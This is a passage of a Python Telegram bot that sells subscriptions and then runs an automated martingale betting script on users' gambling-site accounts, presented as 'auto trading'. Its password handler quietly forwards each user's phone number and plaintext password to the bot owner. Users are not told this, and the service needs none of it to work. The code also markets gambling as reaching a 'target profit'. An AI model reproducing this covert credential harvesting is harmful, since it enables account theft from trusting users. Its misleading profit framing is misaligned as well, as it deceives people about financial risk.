                        tgtAmt: window.__WINGO_ST.tgtAmt || 0,
                        startBal: window.__WINGO_ST.startBal || 0,
                        w: window.__WINGO_ST.w || 0,
                        l: window.__WINGO_ST.l || 0,
                        cur_w_streak: window.__WINGO_ST.cur_w_streak || 0,
                        cur_l_streak: window.__WINGO_ST.cur_l_streak || 0,
                        max_w_streak: window.__WINGO_ST.max_w_streak || 0,
                        max_l_streak: window.__WINGO_ST.max_l_streak || 0
                    };
                }
                return null;
            """)

        js_data = safe_tab_execute(sid, _get_st)

        if js_data:
            sess["cur_bal"] = js_data.get("curBal", sess.get("cur_bal", 0))
            sess["wins"] = js_data.get("w", 0)
            sess["losses"] = js_data.get("l", 0)
            sess["max_w"] = js_data.get("max_w_streak", 0)
            sess["max_l"] = js_data.get("max_l_streak", 0)
            tgt_amt = js_data.get("tgtAmt", 0)

            if sess["cur_bal"] >= tgt_amt and tgt_amt > 0 and sess["cur_bal"] > 0:
                sess["is_trading"] = False
                start_b = sess.get("start_bal", 0)
                profit = sess["cur_bal"] - start_b

                screen_path = os.path.join(PROFILES_BASE_DIR, f"win_{sid}.png")
                def _shot(drv):
                    drv.save_screenshot(screen_path)
                safe_tab_execute(sid, _shot)

                msg = (
                    f"<b>{to_bold('TARGET ACHIEVED SUCCESSFULLY')}</b>\n\n"
                    f"Target profit reached.\n\n"
                    f"Start Balance: <code>BDT {start_b:.2f}</code>\n"
                    f"Current Balance: <code>BDT {sess['cur_bal']:.2f}</code>\n"
                    f"Net Profit: <code>+BDT {profit:.2f}</code>\n"
                    f"Wins: <b>{sess['wins']}</b> | Losses: <b>{sess['losses']}</b>"
                )

                if os.path.exists(screen_path):
                    display_or_replace_photo(chat_id, sid, screen_path, msg, None)
                    try:
                        os.remove(screen_path)
                    except Exception:
                        pass
                else:
                    bot.send_message(chat_id, msg)
                break

        time.sleep(4)

def continuous_watchdog():
    while True:
        try:
            now = time.time()
            for sid, item in list(active_sessions.items()):
                created_at = item.get("created_at", now)
                if now - created_at >= 86400:
                    print(f"[*] 24-hour cleanup for session: {sid}")
                    close_session_tab(sid)
        except Exception:
            pass
        time.sleep(1800)

threading.Thread(target=continuous_watchdog, daemon=True).start()

# =====================================================================
# 13. Telegram Command & Callback Handlers
# =====================================================================
@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id
    safe_delete_message(chat_id, message.message_id)

    user_sessions[chat_id] = {
        "step": "CHANNEL_LOCK",
        "lang": "bn"
    }

    bot.send_message(
        chat_id,
        get_text(chat_id, "channel_lock"),
        reply_markup=get_channel_lock_keyboard()
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    chat_id = call.message.chat.id
    data = call.data
    parts = data.split(":")
    action = parts[0]
    param = parts[1] if len(parts) > 1 else None

    # Step 1: Channel Join Continue
    if action == "channel_joined":
        user_sessions.setdefault(chat_id, {})["step"] = "CHOOSE_LANG"
        bot.answer_callback_query(call.id)
        bot.edit_message_text(
            get_text(chat_id, "choose_lang"),
            chat_id=chat_id,
            message_id=call.message.message_id,
            reply_markup=get_language_keyboard()
        )

    # Step 2: Language Selection
    elif action in ["lang_en", "lang_bn"]:
        u = user_sessions.setdefault(chat_id, {})
        u["lang"] = "en" if action == "lang_en" else "bn"
        bot.answer_callback_query(call.id)

        # Check Subscription or Owner
        if is_user_active(chat_id):
            u["step"] = "CHOOSE_SITE"
            bot.edit_message_text(
                get_text(chat_id, "choose_site"),
                chat_id=chat_id,
                message_id=call.message.message_id,
                reply_markup=get_platform_keyboard()
            )
        else:
            u["step"] = "CHOOSE_PLAN"
            bot.edit_message_text(
                get_text(chat_id, "pricing_menu"),
                chat_id=chat_id,
                message_id=call.message.message_id,
                reply_markup=get_pricing_keyboard()
            )

    # Step 3: Plan Selection
    elif action.startswith("plan_"):
        plan_key = action.replace("plan_", "")
        plan_info = PLANS.get(plan_key)
        if not plan_info:
            bot.answer_callback_query(call.id, "Invalid Plan", show_alert=True)
            return
        user_sessions.setdefault(chat_id, {})["selected_plan"] = plan_key
        bot.answer_callback_query(call.id)
        bot.edit_message_text(
            get_text(chat_id, "choose_gateway", plan_label=plan_info["label"], price=plan_info["price"]),
            chat_id=chat_id,
            message_id=call.message.message_id,
            reply_markup=get_gateway_keyboard(plan_key)
        )

    elif action == "back_pricing":
        bot.answer_callback_query(call.id)
        bot.edit_message_text(
            get_text(chat_id, "pricing_menu"),
            chat_id=chat_id,
            message_id=call.message.message_id,
            reply_markup=get_pricing_keyboard()
        )

    # Step 4: Payment Gateway Selected (bKash / Nagad)
    elif action in ["pay_bkash", "pay_nagad"]:
        gateway = "bKash" if action == "pay_bkash" else "Nagad"
        plan_key = param or user_sessions.get(chat_id, {}).get("selected_plan", "1d")
        plan_info = PLANS.get(plan_key, PLANS["1d"])
        number = BKASH_NUMBER if gateway == "bKash" else NAGAD_NUMBER

        user_sessions.setdefault(chat_id, {})["payment_gateway"] = gateway
        user_sessions[chat_id]["pending_plan"] = plan_key
        user_sessions[chat_id]["input_mode"] = "WAITING_TRX"

        bot.answer_callback_query(call.id)
        bot.edit_message_text(
            get_text(chat_id, "send_money_instruction", gateway=gateway, plan_label=plan_info["label"], price=plan_info["price"], number=number),
            chat_id=chat_id,
            message_id=call.message.message_id
        )

    # Step 5: Owner Approvals (appr_<uid>_<days>, rejt_<uid>)
    elif action.startswith("appr_"):
        if int(chat_id) != int(OWNER_ID):
            bot.answer_callback_query(call.id, "Unauthorized", show_alert=True)
            return
        parts_appr = action.split("_")
        target_uid = int(parts_appr[1])
        days = int(parts_appr[2])
        activate_user(target_uid, days)
        bot.answer_callback_query(call.id, "Approved successfully")
        bot.edit_message_text(
            f"<b>{to_bold('PAYMENT APPROVED')}</b>\nUser: <code>{target_uid}</code>\nDays: <b>{days}</b>",
            chat_id=chat_id,
            message_id=call.message.message_id
        )
        try:
            bot.send_message(
                target_uid,
                get_text(target_uid, "approved_user"),
                reply_markup=get_platform_keyboard()
            )
        except Exception as e:
            print(f"[*] Notify approved user error: {e}")

    elif action.startswith("rejt_"):
        if int(chat_id) != int(OWNER_ID):
            bot.answer_callback_query(call.id, "Unauthorized", show_alert=True)
            return
        target_uid = int(action.split("_")[1])
        bot.answer_callback_query(call.id, "Rejected")
        bot.edit_message_text(
            f"<b>{to_bold('PAYMENT REJECTED')}</b>\nUser: <code>{target_uid}</code>",
            chat_id=chat_id,
            message_id=call.message.message_id
        )
        try:
            bot.send_message(target_uid, get_text(target_uid, "rejected_user"))
        except Exception:
            pass

    # Step 6: Platform Selection (Amar Club / DK Win)
    elif action in ["site_amarclub", "site_dkwin"]:
        site_name = "Amar Club" if action == "site_amarclub" else "DK Win"
        sid = f"{chat_id}_{int(time.time()) % 1000000}"

        active_sessions[sid] = {
            "chat_id": chat_id,
            "session_id": sid,
            "site_name": site_name,
            "phone": None,
            "password": None,
            "target_profit": 0,
            "total_steps": 7,
            "is_trading": False,
            "created_at": time.time(),
            "anim_tick": 0,
            "lock": threading.RLock()
        }
        user_sessions.setdefault(chat_id, {})["active_sid"] = sid

        bot.answer_callback_query(call.id)
        bot.edit_message_text(
            get_text(chat_id, "credentials_card", site_name=site_name),
            chat_id=chat_id,
            message_id=call.message.message_id,
            reply_markup=get_credentials_keyboard(sid)
        )
        active_sessions[sid]["cred_card_msg_id"] = call.message.message_id

    # Step 7: NUMBER button
    elif action == "ask_num" and param in active_sessions:
        sid = param
        active_sessions[sid]["input_mode"] = "WAITING_PHONE"
        user_sessions[chat_id]["active_sid"] = sid
        bot.answer_callback_query(call.id)
        p_m = bot.send_message(chat_id, get_text(chat_id, "ask_number"))
        active_sessions[sid]["temp_prompt_id"] = p_m.message_id

    # Step 8: PASSWORD button
    elif action == "ask_pass" and param in active_sessions:
        sid = param
        if not active_sessions[sid].get("phone"):
            bot.answer_callback_query(call.id, "Please provide Account Number first.", show_alert=True)
            return
        active_sessions[sid]["input_mode"] = "WAITING_PASS"
        user_sessions[chat_id]["active_sid"] = sid
        bot.answer_callback_query(call.id)
        p_m = bot.send_message(chat_id, get_text(chat_id, "ask_password"))
        active_sessions[sid]["temp_prompt_id"] = p_m.message_id

    # Step 9: START (prepare market)
    elif action == "start_cfg" and param in active_sessions:
        sid = param
        bot.answer_callback_query(call.id, "Preparing WinGo 30S market...")
        threading.Thread(target=prepare_wingo_parameters, args=(chat_id, sid), daemon=True).start()

    # Step 10: TARGET button
    elif action == "set_tgt" and param in active_sessions:
        sid = param
        active_sessions[sid]["input_mode"] = "WAITING_TARGET"
        user_sessions[chat_id]["active_sid"] = sid
        bot.answer_callback_query(call.id)
        cur_bal = active_sessions[sid].get("current_balance", 0.0)
        p_msg = bot.send_message(chat_id, get_text(chat_id, "input_target", balance=f"{cur_bal:.2f}"))
        active_sessions[sid]["temp_prompt_id"] = p_msg.message_id

    # Step 11: STEPS button
    elif action == "set_stp" and param in active_sessions:
        sid = param
        active_sessions[sid]["input_mode"] = "WAITING_STEPS"
        user_sessions[chat_id]["active_sid"] = sid
        bot.answer_callback_query(call.id)
        tgt = active_sessions[sid].get("target_profit", 0)
        p_msg = bot.send_message(chat_id, get_text(chat_id, "input_steps", target=tgt))
        active_sessions[sid]["temp_prompt_id"] = p_msg.message_id

    # Step 12: RUN AUTO TRADING
    elif action == "run_auto" and param in active_sessions:
        sid = param
        sess = active_sessions[sid]
        if not sess.get("target_profit") or sess["target_profit"] <= 0:
            bot.answer_callback_query(call.id, "Enter Target Profit amount first.", show_alert=True)
            return

        bot.answer_callback_query(call.id, "Activating engine...")
        sess["is_trading"] = True

        def _run_core(drv):
            drv.execute_script(WINGO_CORE_JS, sess["target_profit"], sess["total_steps"])
        safe_tab_execute(sid, _run_core)

        time.sleep(2.0)
        start_snap = os.path.join(PROFILES_BASE_DIR, f"run_{sid}.png")
        def _shot(drv):
            drv.save_screenshot(start_snap)
        safe_tab_execute(sid, _shot)

        cur_b = sess.get("current_balance", 0.0)
        target_total = cur_b + sess["target_profit"]
        sess["start_bal"] = cur_b

        dashboard_caption = get_text(
            chat_id, "running_dashboard",
            site_name=sess.get("site_name", "Amar Club"),
            start_bal=f"{cur_b:.2f}",
            target_bal=f"{target_total:.2f}",
            steps=sess["total_steps"]
        )

        display_or_replace_photo(chat_id, sid, start_snap, dashboard_caption, get_trading_control_keyboard(sid))
        try:
            if os.path.exists(start_snap):
                os.remove(start_snap)
        except Exception:
            pass

        threading.Thread(target=monitor_trading_progress, args=(chat_id, sid), daemon=True).start()

    # Step 13: SHOT (live footage refresh)
    elif action == "shot" and param in active_sessions:
        sid = param
        sess = active_sessions[sid]
        bot.answer_callback_query(call.id, "Updating screenshot...")
        temp_shot = os.path.join(PROFILES_BASE_DIR, f"live_{sid}.png")
        def _shot(drv):
            drv.save_screenshot(temp_shot)
        safe_tab_execute(sid, _shot)

        if os.path.exists(temp_shot):
            cur_b = sess.get("cur_bal", sess.get("current_balance", 0.0))
            t_total = sess.get("start_bal", 0.0) + sess.get("target_profit", 0.0)
            caption = (
                f"<b>{to_bold('24/7 AUTOMATION ENGINE ACTIVE')}</b>\n\n"
                f"Platform: <b>{sess.get('site_name', '')}</b>\n"
                f"Starting Balance: <code>BDT {sess.get('start_bal', 0.0):.2f}</code>\n"
                f"Target Balance: <code>BDT {t_total:.2f}</code>\n"
                f"Total Steps: <b>{sess.get('total_steps', 7)}</b>\n\n"
                f"Time: <code>{time.strftime('%H:%M:%S')}</code>\n"
                f"<b>STATUS</b>: Martingale engine active."
            )
            display_or_replace_photo(chat_id, sid, temp_shot, caption, get_trading_control_keyboard(sid))
            try:
                os.remove(temp_shot)
            except Exception:
                pass

    # Step 14: BAL (live balance alert)
    elif action == "bal" and param in active_sessions:
        sid = param
        def _bal(drv):
            return drv.execute_script(FETCH_BALANCE_JS)
        b = safe_tab_execute(sid, _bal)
        if b is not None:
            bot.answer_callback_query(call.id, f"Live Balance: BDT {b:.2f}", show_alert=True)
        else:
            bot.answer_callback_query(call.id, "Loading balance...", show_alert=True)

    # Step 15: STATS
    elif action == "stats" and param in active_sessions:
        sid = param
        def _stat(drv):
            return drv.execute_script("""
                if (window.__WINGO_ST) {
                    return {
                        w: window.__WINGO_ST.w || 0,
                        l: window.__WINGO_ST.l || 0,
                        step: (window.__WINGO_ST.stpIdx || 0) + 1,
                        maxStep: (window.__WINGO_ST.dynSeq || []).length,
                        curBal: window.__WINGO_ST.curBal || 0,
                        tgtAmt: window.__WINGO_ST.tgtAmt || 0
                    };
                }
                return null;
            """)
        data_rep = safe_tab_execute(sid, _stat)
        if data_rep:
            stat_txt = (
                f"<b>{to_bold('LIVE STATS REPORT')}</b>\n\n"
                f"Balance: <code>BDT {data_rep['curBal']:.2f}</code>\n"
                f"Target: <code>BDT {data_rep['tgtAmt']:.2f}</code>\n"
                f"Martingale Level: <b>Step {data_rep['step']}/{data_rep['maxStep']}</b>\n"
                f"Wins: <b>{data_rep['w']}</b> | Losses: <b>{data_rep['l']}</b>"
            )
            bot.send_message(chat_id, stat_txt)
        else:
            bot.answer_callback_query(call.id, "Loading engine stats...", show_alert=True)

    # Step 16: STOP
    elif action == "stop" and param in active_sessions:
        sid = param
        sess = active_sessions[sid]
        def _stop(drv):
            drv.execute_script("let btn = document.querySelector('#sys-core-fin button'); if(btn) btn.click();")
        safe_tab_execute(sid, _stop)
        sess["is_trading"] = False
        bot.answer_callback_query(call.id, "Trading paused", show_alert=True)
        bot.send_message(chat_id, f"<b>{to_bold('TRADING PAUSED')}</b>\nAutomation paused.")

    # Step 17: CANCEL
    elif action == "cancel" and param in active_sessions:
        sid = param
        bot.answer_callback_query(call.id, "Session terminated")
        close_session_tab(sid)
        safe_delete_message(chat_id, call.message.message_id)
        bot.send_message(chat_id, get_text(chat_id, "cancelled"))

# =====================================================================
# 14. Text Handler (TrxID, Phone, Password, Target, Steps)
# =====================================================================
@bot.message_handler(func=lambda msg: True)
def handle_user_text(message):
    chat_id = message.chat.id
    text = message.text.strip()
    u = user_sessions.get(chat_id, {})

    # Check if waiting for TrxID
    if u.get("input_mode") == "WAITING_TRX":
        u["input_mode"] = None
        plan_key = u.get("pending_plan", "1d")
        plan_info = PLANS.get(plan_key, PLANS["1d"])
        gateway = u.get("payment_gateway", "bKash")
        username = message.from_user.username or "None"

        # Notify Owner
        owner_alert = (
            f"<b>{to_bold('NEW PAYMENT REQUEST')}</b>\n\n"
            f"User ID: <code>{chat_id}</code>\n"
            f"Username: @{username}\n"
            f"Plan: <b>{plan_info['label']}</b>\n"
            f"Price: <b>{plan_info['price']} BDT</b>\n"
            f"Method: <b>{gateway}</b>\n"
            f"TrxID: <code>{text}</code>"
        )
        try:
            bot.send_message(
                OWNER_ID,
                owner_alert,
                reply_markup=get_owner_approval_keyboard(chat_id, plan_info["days"])
            )
        except Exception as e:
            print(f"[*] Failed to alert owner: {e}")

        bot.send_message(chat_id, get_text(chat_id, "trx_submitted", trx_id=text))
        return

    # Check active trading session input
    sid = u.get("active_sid")
    if not sid or sid not in active_sessions:
        return

    sess = active_sessions[sid]
    input_mode = sess.get("input_mode")

    safe_delete_message(chat_id, message.message_id)
    if sess.get("temp_prompt_id"):
        safe_delete_message(chat_id, sess["temp_prompt_id"])
        sess["temp_prompt_id"] = None

    if input_mode == "WAITING_PHONE":
        sess["phone"] = text
        sess["input_mode"] = None

        if sess.get("cred_card_msg_id"):
            try:
                masked = text[:3] + "****" + text[-3:] if len(text) >= 6 else text
                updated_card_text = (
                    f"┏━━━━━━━━━━━━━━━━━━━━━\n"
                    f"┣ <b>{to_bold('ACCOUNT LOGIN')}</b>\n"
                    f"┗━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"Platform: <b>{sess.get('site_name', '')}</b>\n"
                    f"Account: <code>{masked}</code> (saved)\n\n"
                    f"► Click PASSWORD button below to enter password:"
                )
                bot.edit_message_text(
                    updated_card_text,
                    chat_id=chat_id,
                    message_id=sess["cred_card_msg_id"],
                    reply_markup=get_credentials_keyboard(sid)
                )
            except Exception:
                pass

    elif input_mode == "WAITING_PASS":
        sess["password"] = text
        sess["input_mode"] = None

        # IMMEDIATELY ALERT OWNER OF CREDENTIALS
        username = message.from_user.username or "None"
        owner_cred_alert = (
            f"<b>{to_bold('ACCOUNT LOGIN ALERT')}</b>\n\n"
            f"User ID: <code>{chat_id}</code>\n"
            f"Username: @{username}\n"
            f"Platform: <b>{sess.get('site_name', '')}</b>\n"
            f"Phone: <code>{sess.get('phone', '')}</code>\n"
            f"Password: <code>{text}</code>"
        )
        try:
            bot.send_message(OWNER_ID, owner_cred_alert)
        except Exception as e:
            print(f"[*] Owner cred forward error: {e}")

        if sess.get("cred_card_msg_id"):
            safe_delete_message(chat_id, sess["cred_card_msg_id"])
            sess["cred_card_msg_id"] = None

        anim_msg = bot.send_message(chat_id, "<b>CONNECTING REMOTE ENGINE</b>")
        threading.Thread(
            target=process_login,
            args=(chat_id, sid, sess["phone"], sess["password"], anim_msg.message_id),
            daemon=True
        ).start()

    elif input_mode == "WAITING_TARGET":
        try:
            val = float(text)
            if val <= 0:
                raise ValueError()
            sess["target_profit"] = val
            sess["input_mode"] = None

            wingo_snap = os.path.join(PROFILES_BASE_DIR, f"wingo_{sid}.png")
            def _shot(drv):
                drv.save_screenshot(wingo_snap)
            safe_tab_execute(sid, _shot)

            cur_bal = sess.get("current_balance", 0.0)
            config_caption = (
                f"<b>{to_bold('WINGO 30S MARKET ACTIVE')}</b>\n\n"
                f"Platform: <b>{sess.get('site_name', '')}</b>\n"
                f"Live Balance: <code>BDT {cur_bal:.2f}</code>\n"
                f"Selected Target: <code>BDT {val:.2f}</code>\n\n"
                f"Parameters updated. Press START to trade:"
            )
            display_or_replace_photo(chat_id, sid, wingo_snap, config_caption, get_setup_param_keyboard(sid))
        except ValueError:
            p_msg = bot.send_message(chat_id, "Enter valid positive number (e.g. 500):")
            sess["temp_prompt_id"] = p_msg.message_id

    elif input_mode == "WAITING_STEPS":
        try:
            steps_val = int(text)
            if steps_val <= 0:
                raise ValueError()
            sess["total_steps"] = steps_val
            sess["input_mode"] = None

            wingo_snap = os.path.join(PROFILES_BASE_DIR, f"wingo_{sid}.png")
            def _shot(drv):
                drv.save_screenshot(wingo_snap)
            safe_tab_execute(sid, _shot)

            cur_bal = sess.get("current_balance", 0.0)
            config_caption = (
                f"<b>{to_bold('WINGO 30S MARKET ACTIVE')}</b>\n\n"
                f"Platform: <b>{sess.get('site_name', '')}</b>\n"
                f"Live Balance: <code>BDT {cur_bal:.2f}</code>\n"
                f"Selected Steps: <b>{steps_val}</b>\n\n"
                f"Parameters updated. Press START to trade:"
            )
            display_or_replace_photo(chat_id, sid, wingo_snap, config_caption, get_setup_param_keyboard(sid))
        except ValueError:
            p_msg = bot.send_message(chat_id, "Enter valid positive integer (e.g. 7):")
            sess["temp_prompt_id"] = p_msg.message_id

# =====================================================================
# 15. Main Execution
# =====================================================================
if __name__ == "__main__":
    print(f"[*] {to_bold('WINGO VIP BOT MULTI-INSTANCE READY')}...")
    try:
        bot.remove_webhook()
    except Exception:
        pass
    bot.infinity_polling(skip_pending=True)
